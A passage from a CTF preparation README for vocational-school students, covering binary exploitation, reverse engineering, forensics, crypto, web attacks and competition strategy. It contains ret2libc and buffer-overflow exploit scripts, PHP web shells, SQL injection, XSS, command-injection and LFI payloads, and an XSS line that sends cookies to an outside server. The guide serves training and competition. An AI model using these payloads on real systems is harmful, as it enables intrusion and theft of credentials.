payload += p64(win_addr)  # Overwrite return address

# Send exploit
p.sendline(payload)

# Get flag
p.interactive()
```

**ret2libc (Bypass NX)**:
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Leak libc address
payload = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # Return to main

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Call system('/bin/sh')
payload = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.interactive()
```

**Use Case Example**:
```
Challenge: ./vuln (vulnerable binary)

Steps:
1. checksec ./vuln (check protections)
2. Run: ./vuln (understand input)
3. Find vulnerability (buffer overflow)
4. Find win function: objdump -t vuln | grep win
5. Calculate offset (trial: 32, 64, 128)
6. Write exploit (see code above)
7. Get shell → cat flag.txt
```

**Tools**:
```bash
# Pwntools (Python library)
pip3 install pwntools

# GDB with pwndbg
gdb ./binary
break main
run
cyclic 200
```

---

### 🎯 Format String Bug

**What it is**: Exploiting printf without format specifier

**Leak Memory**:
```python
from pwn import *

p = process('./vuln')

# Leak stack
payload = b'%p ' * 20
p.sendline(payload)
print(p.recvline())

# Leak specific address
payload = b'AAAA' + b'%7$p'  # Read 7th parameter
```

**Write to Memory**:
```python
# Write value to address
target = 0x0804a000
value = 0x41424344

payload = fmtstr_payload(offset, {target: value})
p.sendline(payload)
```

**Use Case Example**:
```
Challenge: printf(user_input) vulnerability

Steps:
1. Test: input "%p %p %p %p"
2. If prints addresses → vulnerable!
3. Leak flag from stack: "%7$s" (try different offsets)
4. Or overwrite GOT entry to win function
```

---

### 🔍 Finding Gadgets (ROP)

```bash
# ROPgadget
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary | grep "pop rsi"

# ropper
ropper --file ./binary --search "pop rdi"

# Use in pwntools
from pwn import *
rop = ROP('./binary')
rop.find_gadget(['pop rdi', 'ret'])
```

---

## 5. Reverse Engineering

### 🔄 Basic Analysis

**File Information**:
```bash
# File type
file binary

# Check if ELF/EXE
file binary
# ELF: Linux executable
# PE32: Windows executable

# Strings (ALWAYS DO THIS FIRST!)
strings binary | grep -i flag
strings binary | grep -i password
strings binary | less

# Check for packing
upx -d binary  # Unpack if UPX packed
```

**Dynamic Analysis**:
```bash
# Run with ltrace (library calls)
ltrace ./binary
ltrace ./binary input

# Run with strace (system calls)
strace ./binary
strace -e trace=open,read ./binary

# Run with input
echo "test" | ./binary
./binary < input.txt
```

**Use Case Example**:
```
Challenge: mystery_binary

Steps:
1. file mystery_binary
2. strings mystery_binary | grep flag
   Output: "Correct! flag{easy_strings}"
3. Done! (if lucky)
```

---

### 🔬 Static Analysis (Ghidra)

**Ghidra Workflow**:

```
1. Import binary
   - File → Import File → Select binary
   
2. Analyze
   - Click "Yes" when asked to analyze
   - Use default options
   
3. Find main()
   - Window → Symbol Tree
   - Search for "main" or "FUN_"
   
4. Decompile
   - Double-click function
   - Right side shows decompiled C code
   
5. Look for:
   - String comparisons
   - Conditional checks
   - Function calls
   - XOR operations
   
6. Trace logic
   - Follow program flow
   - Identify win condition
   - Calculate/patch values
```

**Common Patterns**:
```c
// String comparison
if (strcmp(input, "secret") == 0) {
    print_flag();
}
// Try input: "secret"

// Character-by-character check
if (input[0] == 'f' && input[1] == 'l' && input[2] == 'a' && input[3] == 'g') {
    print_flag();
}
// Reconstruct: "flag..."

// XOR encoding
for (i = 0; i < len; i++) {
    flag[i] = encrypted[i] ^ 0x42;
}
// Reverse in Python
```

**Use Case Example**:
```
Challenge: crackme (asks for password)

Steps:
1. Open in Ghidra
2. Analyze → Find main()
3. See decompiled code:
   if (strcmp(input, "P@ssw0rd123") == 0) {
       puts("flag{correct_password}");
   }
4. Run: ./crackme
   Enter: P@ssw0rd123
5. Get flag!
```

---

### 🐞 Dynamic Analysis (GDB + Pwndbg)

**Basic GDB Commands**:
```bash
# Start GDB
gdb ./binary

# Set breakpoint
break main
break *0x08048400  # At address

# Run
run
run arg1 arg2

# Disassemble
disassemble main
disas main

# Step through
si    # Step instruction
ni    # Next instruction (skip calls)
c     # Continue

# Examine memory
x/20x $rsp     # 20 hex values at stack
x/s 0x804a000  # String at address
x/i $rip       # Instruction at RIP

# Registers
info registers
print $rax
set $rax = 0x1234

# Backtrace
bt

# Search memory
search "flag"
```

**Pwndbg Enhancements**:
```bash
# Automatic context (registers, stack, disasm)
# Shows on every step

# Heap commands
heap
bins
vis_heap_chunks

# Cyclic pattern
cyclic 200
cyclic -l 0x6161616c
```

**Use Case Example**:
```
Challenge: Need to make check() return true

Steps:
1. gdb ./binary
2. break check
3. run
4. disas check
5. See: cmp eax, 0x1337
        je success
6. Set eax: set $eax = 0x1337
7. continue
8. Get flag!
```

---

### 📦 Obfuscation Techniques

**Common Obfuscations**:

1. **Packing** (UPX):
```bash
# Detect
file binary  # "packed by UPX"

# Unpack
upx -d binary
```

2. **String Encoding**:
```python
# Often Base64 or XOR
# Look for decode functions in Ghidra

# XOR decoding
encrypted = [0x12, 0x34, 0x56, ...]
key = 0x42
flag = ''.join(chr(x ^ key) for x in encrypted)
```

3. **Anti-Debug**:
```c
// Checks for debugger
if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
    exit(1);  // Debugger detected!
}

// Bypass: patch binary or use LD_PRELOAD
```

4. **Control Flow Flattening**:
```
// Makes decompilation harder
// Use dynamic analysis instead
```

---

## 💡 Pro Tips & Strategy

### 🎯 Competition Strategy

**Before the Competition**:
```
✅ Install ALL tools from setup script
✅ Test tools (run sample CTFs on PicoCTF)
✅ Bookmark all online tools
✅ Prepare note-taking template
✅ Sleep well (seriously!)
✅ Check laptop battery & internet
```

**Time Management** (5 hours total):
```
Hour 1 (Online - 31 Okt):
├── Read ALL challenges (15 min)
├── Solve easy Forensics (45 min)
└── Start Rev Engineering (30 min)

Hour 2-3 (Online):
├── Complete Rev Engineering
├── Tackle medium challenges
└── Document findings (PoC draft)

Hour 4-5 (Onsite - 1 Nov):
├── Web Exploitation (priority!)
├── Crypto challenges
├── PWN if time permits
└── Finalize PoC reports (30% score!)
```

**Challenge Prioritization**:
```
1. 🟢 Easy challenges (100-300 pts) - DO FIRST
   - Strings in forensics
   - Basic encodings
   - Simple web SQLi
   
2. 🟡 Medium challenges (400-600 pts)
   - Steganography
   - RSA attacks
   - Command injection
   
3. 🔴 Hard challenges (700-1000 pts)
   - Binary exploitation
   - Complex crypto
   - Advanced web (XXE, Deserialization)
```

**Team Coordination** (2 members):
```
Member 1:           Member 2:
├── Web Exploit     ├── Forensics
├── Crypto          ├── Rev Engineering
└── Support PWN     └── Support Web

Communication:
- Share findings immediately
- If stuck > 20 min, switch tasks
- Help each other on hard challenges
```

### 📝 PoC Report Template

```markdown
# Challenge: [Name]
**Category**: [Web/Forensics/Crypto/PWN/Rev]  
**Points**: [500]  
**Difficulty**: [Easy/Medium/Hard]

---

## 1. Challenge Description
> Brief description of what the challenge asks

Example: "A login page is provided. Find the admin password and retrieve the flag."

## 2. Initial Analysis
**Tools Used**: Burp Suite, SQLmap

**First Observations**:
- Login form with username and password fields
- No rate limiting detected
- Error messages reveal SQL syntax

## 3. Vulnerability Identified
**Type**: SQL Injection (Error-based)

**Evidence**:
```sql
Input: admin' OR '1'='1'--
Response: SQL syntax error revealed
```

## 4. Exploitation Steps

**Step 1: Confirm SQLi**
```bash
# Test payload
Username: admin' OR '1'='1'--
Password: anything
Result: Successfully bypassed authentication
```

**Step 2: Extract Database**
```bash
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --dbs
# Found databases: information_schema, ctf_db
```

**Step 3: Dump Tables**
```bash
sqlmap -u "..." -D ctf_db --tables
# Found table: secret_flags
```

**Step 4: Extract Flag**
```bash
sqlmap -u "..." -D ctf_db -T secret_flags --dump
# Retrieved: flag{sql_1nj3ct10n_m4st3r}
```

## 5. Flag
```
flag{sql_1nj3ct10n_m4st3r}
```

## 6. Screenshots
[Include screenshots of:]
- Vulnerable input
- SQLmap output
- Flag retrieval

## 7. Mitigation
- Use prepared statements (parameterized queries)
- Implement input validation
- Apply principle of least privilege
```

**PoC Tips**:
- Write as you go (don't wait until end!)
- Screenshot EVERYTHING
- Copy-paste commands/outputs
- Be clear and concise
- Show understanding, not just tool usage

---

## 📚 Learning Resources

### 🎮 Practice Platforms

**Beginner-Friendly**:
```
🌟 PicoCTF: https://picoctf.org/
   - Perfect for learning
   - Detailed hints
   - All categories

🌟 OverTheWire: https://overthewire.org/
   - Wargames format
   - Progressive difficulty
   - Bandit (Linux), Natas (Web)

🌟 TryHackMe: https://tryhackme.com/
   - Guided rooms
   - CTF-style challenges
   - Free tier available
```

**Intermediate**:
```
🔥 HackTheBox: https://www.hackthebox.com/
   - Realistic machines
   - Active community
   - Requires registration

🔥 Root-Me: https://www.root-me.org/
   - 400+ challenges
   - All categories
   - French & English
```

**CTF Archives**:
```
📦 CTFtime: https://ctftime.org/
   - Upcoming CTFs
   - Past writeups
   - Team rankings

📦 CTF Writeups: https://ctf-writeups.github.io/
   - Solutions from past CTFs
   - Learn techniques
```

### 📖 Cheatsheets & References

**Web Exploitation**:
```
🔗 PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
🔗 HackTricks: https://book.hacktricks.xyz/
🔗 OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
🔗 PortSwigger Web Academy: https://portswigger.net/web-security
```

**Forensics**:
```
🔗 Forensics Wiki: https://forensics.wiki/
🔗 SANS DFIR: https://digital-forensics.sans.org/
🔗 Steganography Tools: https://0xrick.github.io/lists/stego/
```

**Cryptography**:
```
🔗 CryptoHack: https://cryptohack.org/
🔗 Crypto101: https://www.crypto101.io/
🔗 dcode.fr: https://www.dcode.fr/
```

**Binary Exploitation**:
```
🔗 Nightmare (PWN Course): https://guyinatuxedo.github.io/
🔗 ROP Emporium: https://ropemporium.com/
🔗 pwn.college: https://pwn.college/
```

**Reverse Engineering**:
```
🔗 Crackmes.one: https://crackmes.one/
🔗 Malware Unicorn: https://malwareunicorn.org/workshops/
🔗 Ghidra Cheat Sheet: https://ghidra-sre.org/CheatSheet.html
```

---

## 🔗 Essential Links

### 🛠️ Online Tools

**Multi-Purpose**:
```
🌟 CyberChef: https://gchq.github.io/CyberChef/
   - Encoding/decoding
   - Crypto operations
   - Data manipulation
   - MUST HAVE!

🌟 dcode.fr: https://www.dcode.fr/
   - Cipher identifier
   - Classic ciphers
   - Encoding tools
```

**Web Testing**:
```
🔧 Burp Collaborator: https://burpcollaborator.net/
🔧 Request Bin: https://requestbin.com/
🔧 Webhook.site: https://webhook.site/
🔧 JWT.io: https://jwt.io/
```

**Cryptography**:
```
🔐 CrackStation: https://crackstation.net/
🔐 Hash Analyzer: https://www.tunnelsup.com/hash-analyzer/
🔐 FactorDB: http://factordb.com/
🔐 RSA Calculator: https://www.cs.drexel.edu/~jpopyack/IntroCS/RSA/RSAWorksheet.html
```

**Forensics**:
```
🔍 Forensically: https://29a.ch/photo-forensics/
🔍 Aperisolve: https://aperisolve.fr/
🔍 StegOnline: https://stegonline.georgeom.net/
🔍 MX Toolbox: https://mxtoolbox.com/
```

**OSINT**:
```
🕵️ Sherlock Project: https://sherlock-project.github.io/
🕵️ OSINT Framework: https://osintframework.com/
🕵️ IntelTechniques: https://inteltechniques.com/tools/
🕵️ Wayback Machine: https://web.archive.org/
```

### 📱 Mobile Apps

```
📲 Termux (Android) - Run Linux tools on phone
📲 UserLAnd (Android) - Full Linux environment
📲 Pythonista (iOS) - Python environment
```

### 💬 Communities

```
💭 CTF Discord Servers
💭 r/securityCTF (Reddit)
💭 Stack Exchange - Security
💭 Indonesian: Telegram CTF Indonesia Groups
```

---

## 🚀 Quick Reference Commands

### Web Exploitation Quick Commands

```bash
# SQL Injection
sqlmap -u "URL" --batch --dbs
sqlmap -u "URL" --forms --batch
sqlmap -r request.txt --dump

# Directory Fuzzing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt

# Subdomain Enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Nikto Scan
nikto -h http://target.com

# Web Shells (if RCE found)
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

### Forensics Quick Commands

```bash
# Image Analysis
strings image.jpg | grep -i flag
exiftool image.jpg
binwalk -e image.jpg
steghide extract -sf image.jpg
zsteg image.png -a

# PCAP Analysis
wireshark capture.pcap
tshark -r capture.pcap -Y "http"
tcpflow -r capture.pcap

# Memory Forensics
volatility3 -f memory.dmp windows.info
volatility3 -f memory.dmp windows.pslist
volatility3 -f memory.dmp windows.filescan | grep flag

# File Carving
foremost -i disk.img -o output/
binwalk -e firmware.bin
```

### Crypto Quick Commands

```bash
# Encoding
echo "text" | base64
echo "base64text" | base64 -d
echo "hex" | xxd -r -p

# Hashing
echo -n "text" | md5sum
echo -n "text" | sha256sum

# Hash Cracking
john --wordlist=rockyou.txt hash.txt
hashcat -m 0 hash.txt rockyou.txt

# RSA
python3 ~/ctf-tools/RsaCtfTool/RsaCtfTool.py --publickey pub.pem --uncipherfile flag.enc
```

### PWN Quick Commands

```bash
# Check Binary
file binary
checksec binary
strings binary | grep -i flag

# Find Gadgets
ROPgadget --binary binary | grep "pop rdi"

# GDB
gdb ./binary
break main
run
disas main
```

### Rev Eng Quick Commands

```bash
# Basic Analysis
file binary
strings binary | less
ltrace ./binary
strace ./binary

# Unpacking
upx -d binary

# Disassembly
objdump -d binary | less
radare2 -A binary
```

---

## 🎯 Challenge-Specific Tips

### Web Exploitation

**SQL Injection**:
```
✅ Always try: ' OR '1'='1'--
✅ Check error messages (reveals DB type)
✅ Use UNION for data extraction
✅ Time-based when no output (SLEEP, BENCHMARK)
✅ SQLmap is your friend, but understand manual techniques
```

**XSS**:
```
✅ Test in all input fields (including URL params)
✅ Check if input reflected in response
✅ Try basic: <script>alert(1)</script>
✅ Bypass filters: <img src=x onerror=alert(1)>
✅ Cookie stealing: document.location='http://your-server/?c='+document.cookie
```

**Command Injection**:
```
✅ Try all separators: ; | || & && ` $()
✅ Common commands: ls, cat, whoami, id
✅ Bypass spaces: cat</etc/passwd or cat${IFS}/etc/passwd
✅ Find flag: find / -name flag.txt 2>/dev/null
```

**LFI**:
```
✅ Start with: ../../../../etc/passwd
✅ Common files: /etc/passwd, /proc/self/environ, /var/log/apache2/access.log
✅ PHP wrappers: php://filter/convert.base64-encode/resource=index.php
✅ Log poisoning for RCE
```

**JWT**:
```
✅ Decode at jwt.io
✅ Try alg:none attack
✅ Bruteforce weak secrets
✅ Check kid parameter for injection
```

### Digital Forensics

**Steganography**:
```
✅ ALWAYS run strings first!
✅ Check EXIF metadata: exiftool
✅ Extract with binwalk
✅ Steghide for password-protected
✅ Stegsolve for LSB/bit planes
✅ Try zsteg for PNG/BMP
```

**PCAP**:
```
✅ Open in Wireshark
✅ Check Protocol Hierarchy
✅ Export Objects (HTTP/FTP/SMB)
✅ Follow TCP streams
✅ Search for strings: frame contains "flag"
✅ Look for credentials in plaintext protocols
```

**Memory**:
```
✅ Get OS info first
✅ List processes (suspicious ones?)
✅ Check command lines
✅ Filescan for interesting files
✅ Dump suspicious process memory
✅ Always try strings on dump
```

**Logs**:
```
✅ Failed logins: grep "Failed password"
✅ Successful logins: grep "Accepted"
✅ Extract IPs: grep -oE pattern
✅ Look for suspicious commands
✅ Check unusual times/patterns
```

### Cryptography

**Encoding**:
```
✅ Use CyberChef "Magic" operation
✅ Base64 has = padding
✅ Hex is 0-9 a-f
✅ Try multiple layers
✅ ROT13 for simple substitution
```

**Classic Ciphers**:
```
✅ Caesar: try all 25 shifts
✅ Vigenère: needs key (try common words)
✅ Atbash: reverse alphabet
✅ Use dcode.fr cipher identifier
```

**RSA**:
```
✅ Check if N is small (factordb.com)
✅ If e=3, try cube root attack
✅ Use RsaCtfTool for all automated attacks
✅ Check for common modulus, Wiener's attack
```

**Hashes**:
```
✅ Identify with hashid
✅ Try online crackers first (fast!)
✅ Use john/hashcat with rockyou.txt
✅ MD5: 32 chars, SHA1: 40 chars, SHA256: 64 chars
```

### Binary Exploitation

**Buffer Overflow**:
```
✅ Check protections with checksec
✅ Find offset with cyclic pattern
✅ Look for win/flag functions
✅ Overwrite return address
✅ If NX enabled, use ROP
```

**Format String**:
```
✅ Test with %p %p %p
✅ Leak memory with %N$p
✅ Write with %n
✅ Use pwntools fmtstr_payload
```

**General**:
```
✅ Always check strings first
✅ Use ltrace/strace
✅ GDB for dynamic analysis
✅ Look for buffer, gets, scanf, strcpy
```

### Reverse Engineering

**Static Analysis**:
```
✅ strings binary | grep flag (try first!)
✅ Look for comparisons in Ghidra
✅ Trace from main() to win condition
✅ Check for XOR operations
✅ Look for hardcoded values
```

**Dynamic Analysis**:
```
✅ Run with ltrace (see library calls)
✅ GDB + breakpoints
✅ Patch instructions if needed
✅ set $eax = desired_value
```

**Obfuscation**:
```
✅ Check for UPX packing
✅ Look for decode functions
✅ Anti-debug: patch or use LD_PRELOAD
✅ When stuck, try dynamic analysis
```

---

## 🏁 Final Checklist

### 📋 Day Before Competition (28 Oktober)

```
Hardware:
□ Laptop fully charged
□ Charger packed
□ Mouse (optional but helpful)
□ Backup power bank
□ Stable internet (test speed)

Software:
□ All tools installed and tested
□ PayloadsAllTheThings cloned
□ Wordlists ready (rockyou.txt, SecLists)
□ Burp Suite configured
□ Browser + extensions ready
□ Text editor for notes

References:
□ Bookmark CyberChef
□ Bookmark dcode.fr
□ Bookmark jwt.io
□ Bookmark crackstation.net
□ Save this README offline!

Mental Prep:
□ Sleep 7-8 hours
□ Light review of concepts
□ Confidence boosted 💪
```

### 📋 Technical Meeting (29 Oktober 19:30)

```
Notes to Take:
□ CTF platform URL/IP
□ Registration/login details
□ Flag format (flag{...} or FLAG{...}?)
□ Scoring system (dynamic/static)
□ Submission method
□ Time zones/schedules
□ Rules & restrictions
□ Q&A opportunities
```

### 📋 During Competition

```
First 15 Minutes:
□ Test CTF platform access
□ Read ALL challenges
□ Identify easy ones
□ Note point values
□ Check if points are dynamic

Every Hour:
□ Switch tasks if stuck >20 min
□ Document progress for PoC
□ Screenshot important findings
□ Communicate with teammate
□ Check scoreboard

Last 30 Minutes:
□ Finalize PoC reports (30% of score!)
□ Submit all flags (double-check format)
□ Polish documentation
□ Review incomplete challenges
```

---

## 🎓 Advanced Tips & Tricks

### 🧠 Problem-Solving Mindset

```
When Stuck:
1. Take a deep breath (5 min break)
2. Read challenge description again
3. Google the exact error message
4. Search: "CTF [challenge_type] [specific_issue]"
5. Check CTFtime writeups for similar challenges
6. Ask teammate for fresh perspective
7. Move to another challenge, come back later

Red Flags (Hints):
- "The admin password is very weak" → Bruteforce/common passwords
- "This encryption is unbreakable" → Probably weak/broken crypto
- "Only the admin can see the flag" → Privilege escalation needed
- "Ancient cipher used" → Classic cipher (Caesar, Vigenère)
- "Modern security" → Might be JWT, OAuth issues
```

### 🔥 Common CTF Patterns

```
Flag Locations:
□ In source code (HTML comments, JS files)
□ In cookies/localStorage
□ In HTTP headers (X-Flag, X-Secret)
□ In robots.txt, sitemap.xml
□ In .git folder (exposed Git)
□ In database (SQL injection)
□ In environment variables
□ In /proc/self/environ
□ In image EXIF data
□ In DNS TXT records
□ Base64 encoded somewhere
□ Split across multiple locations

Hidden Content:
□ White text on white background
□ Display: none CSS
□ Zero-width characters
□ Unicode tricks
□ Steganography
□ ROT13/Caesar shifted
□ Comments in binaries
□ Encrypted/encoded strings
```

### 💎 Pro Techniques

**Web**:
```python
# Automatic XSS in all params
import requests
params = ['id', 'user', 'page', 'file', 'q']
xss = "<script>alert(1)</script>"
for p in params:
    r = requests.get(f"http://target.com/page?{p}={xss}")
    if xss in r.text:
        print(f"XSS found in: {p}")
```

**Crypto**:
```python
# Quick frequency analysis
text = "ENCRYPTED_TEXT"
from collections import Counter
freq = Counter(text)
print(freq.most_common(10))
# Compare with English: E T A O I N S H R D
```

**Forensics**:
```bash
# Extract ALL strings from binary file
strings -n 8 file.bin > all_strings.txt
grep -i "flag\|ctf\|password" all_strings.txt
```

**Scripting**:
```python
# Quick HTTP fuzzer
import requests
for i in range(1, 1000):
    r = requests.get(f"http://target.com/file?id={i}")
    if "flag" in r.text.lower():
        print(f"Found at id={i}: {r.text}")
        break
```

---

## 📱 Emergency Contacts & Resources

### During Competition Issues

```
Technical Issues:
- Internet down → Use mobile hotspot backup
- Laptop crash → Have tools list for quick reinstall
- Platform down → Screenshot for proof, notify juri

Can't Solve Challenge:
- Stuck >30 min → Move on, return later
- Need hint → Check challenge description again
- Documentation → Search "[challenge_name] CTF writeup"
```

### Useful Discord Communities

```
🌐 International:
- CTF Discord servers (search "CTF" on Discord)
- r/securityCTF subreddit
- LiveOverflow Discord

🇮🇩 Indonesia:
- Hacker Indonesia (Telegram)
- CTF Indonesia (search on Telegram)
- Ethical Hacker Indonesia
```

---

## 🎉 Motivational Section

### Remember:

```
💪 You've Got This!
- You prepared well
- You have the tools
- You have the knowledge
- Trust your instincts

🧠 Learning Mindset:
- Every challenge teaches something
- Stuck = learning opportunity
- Compare with teammates after
- Writeups make you better

🏆 Success Metrics:
- Solved 1 challenge? → You learned!
- Solved 3 challenges? → You're good!
- Solved 5+ challenges? → You're amazing!
- Top 3 placement? → You're a legend!

Remember: CTF is about learning, not just winning.
Even if you don't win, the skills you gain are invaluable.
```

---

## 📚 Appendix: Tool Installation Troubleshooting

### Common Issues

**Issue**: SQLmap not working
```bash
# Solution:
pip3 install --upgrade sqlmap
# Or
sudo apt install sqlmap --reinstall
```

**Issue**: Volatility3 errors
```bash
# Solution:
pip3 install volatility3
# Or download:
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt
```

**Issue**: Pwntools installation fails
```bash
# Solution (Ubuntu/Debian):
sudo apt install python3-dev libssl-dev libffi-dev
pip3 install --upgrade pwntools
```

**Issue**: Ghidra won't start
```bash
# Solution:
# Ensure Java JDK 11+ installed
sudo apt install openjdk-17-jdk
# Then run:
./ghidraRun
```

**Issue**: Binwalk extraction fails
```bash
# Solution:
sudo apt install binwalk python3-magic
pip3 install binwalk
```

---

## 🔖 Quick Search Index

**Need to**:
- Crack hash → [Hash Cracking](#-hash-cracking)
- Test SQL injection → [SQL Injection](#-sql-injection)
- Extract hidden files → [File Recovery](#-file-recovery--carving)
- Analyze network traffic → [Network Forensics](#-network-forensics-pcap)
- Reverse engineer → [Reverse Engineering](#5-reverse-engineering)
- Exploit buffer overflow → [Buffer Overflow](#-buffer-overflow-basics)
- Decode Base64 → [Encoding/Decoding](#-encodingdecoding)
- Find RSA weakness → [RSA Attacks](#-rsa-attacks)
- Hide in image → [Steganography](#️-steganography)
- Inject commands → [Command Injection](#-command-injection)

---

## 📄 License & Credits

```
📝 Created for: LKS Cyber Security 2026 - SMKN 1 Cimahi
👥 Target Audience: SIJA Students
📅 Last Updated: October 2025
⭐ Good Luck to All Teams!

Special Thanks:
- PayloadsAllTheThings contributors
- Pwntools developers
- CTF community worldwide
- All open-source tool creators

Remember:
"The only way to do great work is to love what you do"
- Steve Jobs

"Hacking is not about breaking things, 
 it's about understanding how they work"
- Anonymous
```

---

**End of README**

*For updates and additional resources, star this repository!*  
*Questions? Create an issue or ask your team mentor.*

**Happy Hacking! 🎯💻🔥**